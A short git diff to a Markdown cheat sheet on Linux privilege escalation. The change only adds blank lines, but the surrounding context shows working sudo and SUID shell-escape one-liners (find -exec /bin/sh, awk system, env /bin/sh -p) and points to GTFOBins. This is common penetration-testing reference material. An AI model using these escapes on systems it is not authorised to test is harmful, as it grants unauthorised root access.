@@ -64,6 +64,7 @@ A cheat sheet of common commands and pathways for enumerating and escalating pri
 If you find SUID binaries or programs allowed via `sudo -l`, look them up on **[GTFOBins](https://gtfobins.github.io/)** to find shell escape sequences.
 
 *Example Sudo Escapes:*
+
 ```bash
 # Sudo exploit for /usr/bin/find
 sudo find . -exec /bin/sh \; -quit
@@ -76,6 +77,7 @@ sudo awk 'BEGIN {system("/bin/sh")}'
 ```
 
 *Example SUID Escapes:*
+
 ```bash
 # SUID exploit for env
 /usr/bin/env /bin/sh -p
